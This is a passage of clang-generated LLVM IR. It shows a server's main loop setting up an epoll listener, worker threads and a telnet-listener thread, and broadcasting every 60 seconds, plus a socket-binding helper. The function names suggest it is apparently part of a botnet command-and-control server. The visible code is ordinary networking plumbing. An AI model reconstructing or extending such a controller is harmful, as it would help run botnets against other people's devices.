  %45 = getelementptr inbounds i8*, i8** %44, i64 1
  %46 = load i8*, i8** %45, align 8
  %47 = call i32 @create_and_bind(i8* %46)
  store volatile i32 %47, i32* @listenFD, align 4
  %48 = load volatile i32, i32* @listenFD, align 4
  %49 = icmp eq i32 %48, -1
  br i1 %49, label %50, label %51

50:                                               ; preds = %42
  call void @abort() #11
  unreachable

51:                                               ; preds = %42
  %52 = load volatile i32, i32* @listenFD, align 4
  %53 = call i32 @make_socket_non_blocking(i32 %52)
  store i32 %53, i32* %8, align 4
  %54 = load i32, i32* %8, align 4
  %55 = icmp eq i32 %54, -1
  br i1 %55, label %56, label %57

56:                                               ; preds = %51
  call void @abort() #11
  unreachable

57:                                               ; preds = %51
  %58 = load volatile i32, i32* @listenFD, align 4
  %59 = call i32 @listen(i32 %58, i32 4096) #9
  store i32 %59, i32* %8, align 4
  %60 = load i32, i32* %8, align 4
  %61 = icmp eq i32 %60, -1
  br i1 %61, label %62, label %63

62:                                               ; preds = %57
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.153, i64 0, i64 0))
  call void @abort() #11
  unreachable

63:                                               ; preds = %57
  %64 = call i32 @epoll_create1(i32 0) #9
  store volatile i32 %64, i32* @epollFD, align 4
  %65 = load volatile i32, i32* @epollFD, align 4
  %66 = icmp eq i32 %65, -1
  br i1 %66, label %67, label %68

67:                                               ; preds = %63
  call void @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.154, i64 0, i64 0))
  call void @abort() #11
  unreachable

68:                                               ; preds = %63
  %69 = load volatile i32, i32* @listenFD, align 4
  %70 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 1
  %71 = bitcast %union.epoll_data* %70 to i32*
  store i32 %69, i32* %71, align 1
  %72 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 0
  store i32 -2147483647, i32* %72, align 1
  %73 = load volatile i32, i32* @epollFD, align 4
  %74 = load volatile i32, i32* @listenFD, align 4
  %75 = call i32 @epoll_ctl(i32 %73, i32 1, i32 %74, %struct.epoll_event* %11) #9
  store i32 %75, i32* %8, align 4
  %76 = load i32, i32* %8, align 4
  %77 = icmp eq i32 %76, -1
  br i1 %77, label %78, label %79

78:                                               ; preds = %68
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.19, i64 0, i64 0))
  call void @abort() #11
  unreachable

79:                                               ; preds = %68
  %80 = load i32, i32* %9, align 4
  %81 = add nsw i32 %80, 2
  %82 = zext i32 %81 to i64
  %83 = call i8* @llvm.stacksave()
  store i8* %83, i8** %12, align 8
  %84 = alloca i64, i64 %82, align 16
  store i64 %82, i64* %13, align 8
  br label %85

85:                                               ; preds = %89, %79
  %86 = load i32, i32* %9, align 4
  %87 = add nsw i32 %86, -1
  store i32 %87, i32* %9, align 4
  %88 = icmp ne i32 %86, 0
  br i1 %88, label %89, label %95

89:                                               ; preds = %85
  %90 = load i32, i32* %9, align 4
  %91 = add nsw i32 %90, 1
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds i64, i64* %84, i64 %92
  %94 = call i32 @pthread_create(i64* %93, %union.pthread_attr_t* null, i8* (i8*)* @epollEventLoop, i8* null) #9
  br label %85, !llvm.loop !19

95:                                               ; preds = %85
  %96 = getelementptr inbounds i64, i64* %84, i64 0
  %97 = load i32, i32* %10, align 4
  %98 = sext i32 %97 to i64
  %99 = inttoptr i64 %98 to i8*
  %100 = call i32 @pthread_create(i64* %96, %union.pthread_attr_t* null, i8* (i8*)* bitcast (i8* (i32)* @telnetListener to i8* (i8*)*), i8* %99) #9
  br label %101

101:                                              ; preds = %102, %95
  br label %102

102:                                              ; preds = %101
  call void @broadcast(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.17, i64 0, i64 0), i32 -1, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.155, i64 0, i64 0))
  %103 = call i32 @sleep(i32 60)
  br label %101
}

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

; Function Attrs: noreturn nounwind
declare void @exit(i32) #6

; Function Attrs: nounwind readonly willreturn
declare i32 @atoi(i8*) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @create_and_bind(i8* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct.addrinfo, align 8
  %5 = alloca %struct.addrinfo*, align 8
  %6 = alloca %struct.addrinfo*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  %10 = bitcast %struct.addrinfo* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 8 %10, i8 0, i64 48, i1 false)
  %11 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 1
  store i32 0, i32* %11, align 4
  %12 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 2
  store i32 1, i32* %12, align 8
  %13 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 0
  store i32 1, i32* %13, align 8
  %14 = load i8*, i8** %3, align 8
  %15 = call i32 @getaddrinfo(i8* null, i8* %14, %struct.addrinfo* %4, %struct.addrinfo** %5)
  store i32 %15, i32* %7, align 4
  %16 = load i32, i32* %7, align 4
  %17 = icmp ne i32 %16, 0
  br i1 %17, label %18, label %23

18:                                               ; preds = %1
  %19 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %20 = load i32, i32* %7, align 4
  %21 = call i8* @gai_strerror(i32 %20) #9
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %19, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.157, i64 0, i64 0), i8* %21)
  store i32 -1, i32* %2, align 4
  br label %76

23:                                               ; preds = %1
  %24 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  store %struct.addrinfo* %24, %struct.addrinfo** %6, align 8
  br label %25

25:                                               ; preds = %63, %23
  %26 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %27 = icmp ne %struct.addrinfo* %26, null
  br i1 %27, label %28, label %67

28:                                               ; preds = %25
  %29 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %30 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %29, i32 0, i32 1
  %31 = load i32, i32* %30, align 4
  %32 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %33 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %32, i32 0, i32 2
  %34 = load i32, i32* %33, align 8
  %35 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %36 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %35, i32 0, i32 3
  %37 = load i32, i32* %36, align 4
  %38 = call i32 @socket(i32 %31, i32 %34, i32 %37) #9
  store i32 %38, i32* %8, align 4
  %39 = load i32, i32* %8, align 4
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %41, label %42

41:                                               ; preds = %28
  br label %63

42:                                               ; preds = %28
  store i32 1, i32* %9, align 4
  %43 = load i32, i32* %8, align 4
  %44 = bitcast i32* %9 to i8*
  %45 = call i32 @setsockopt(i32 %43, i32 1, i32 2, i8* %44, i32 4) #9
  %46 = icmp eq i32 %45, -1
  br i1 %46, label %47, label %48

47:                                               ; preds = %42
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.158, i64 0, i64 0))
  br label %48

48:                                               ; preds = %47, %42
  %49 = load i32, i32* %8, align 4
  %50 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %51 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %50, i32 0, i32 5
  %52 = load %struct.sockaddr*, %struct.sockaddr** %51, align 8
  %53 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %54 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %53, i32 0, i32 4
  %55 = load i32, i32* %54, align 8
  %56 = call i32 @bind(i32 %49, %struct.sockaddr* %52, i32 %55) #9
  store i32 %56, i32* %7, align 4
  %57 = load i32, i32* %7, align 4
  %58 = icmp eq i32 %57, 0
  br i1 %58, label %59, label %60

59:                                               ; preds = %48
  br label %67

60:                                               ; preds = %48
  %61 = load i32, i32* %8, align 4
  %62 = call i32 @close(i32 %61)
  br label %63

63:                                               ; preds = %60, %41
  %64 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %65 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %64, i32 0, i32 7
  %66 = load %struct.addrinfo*, %struct.addrinfo** %65, align 8
  store %struct.addrinfo* %66, %struct.addrinfo** %6, align 8
  br label %25, !llvm.loop !20

67:                                               ; preds = %59, %25
  %68 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %69 = icmp eq %struct.addrinfo* %68, null
  br i1 %69, label %70, label %73

70:                                               ; preds = %67
  %71 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %72 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %71, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.159, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %76

73:                                               ; preds = %67
  %74 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  call void @freeaddrinfo(%struct.addrinfo* %74) #9
  %75 = load i32, i32* %8, align 4
  store i32 %75, i32* %2, align 4
  br label %76

76:                                               ; preds = %73, %70, %18
  %77 = load i32, i32* %2, align 4
  ret i32 %77
}

; Function Attrs: noreturn nounwind
declare void @abort() #6

; Function Attrs: nounwind
declare i32 @epoll_create1(i32) #3

; Function Attrs: nofree nosync nounwind willreturn
declare i8* @llvm.stacksave() #7

declare i32 @fcntl(i32, i32, ...) #1

declare i32 @getaddrinfo(i8*, i8*, %struct.addrinfo*, %struct.addrinfo**) #1

; Function Attrs: nounwind
declare i8* @gai_strerror(i32) #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @freeaddrinfo(%struct.addrinfo*) #3

attributes #0 = { noinline nounwind optnone sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { nounwind readonly willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { argmemonly nofree nounwind willreturn writeonly }
attributes #5 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #6 = { noreturn nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #7 = { nofree nosync nounwind willreturn }
attributes #8 = { nounwind readonly willreturn }
attributes #9 = { nounwind }
attributes #10 = { nounwind readnone willreturn }
attributes #11 = { noreturn nounwind }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{i32 7, !"PIC Level", i32 2}
!2 = !{i32 7, !"PIE Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
!5 = !{!"clang version 13.0.1"}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
!13 = distinct !{!13, !7}
!14 = distinct !{!14, !7}
!15 = distinct !{!15, !7}
!16 = distinct !{!16, !7}
!17 = distinct !{!17, !7}
!18 = distinct !{!18, !7}
!19 = distinct !{!19, !7}
!20 = distinct !{!20, !7}
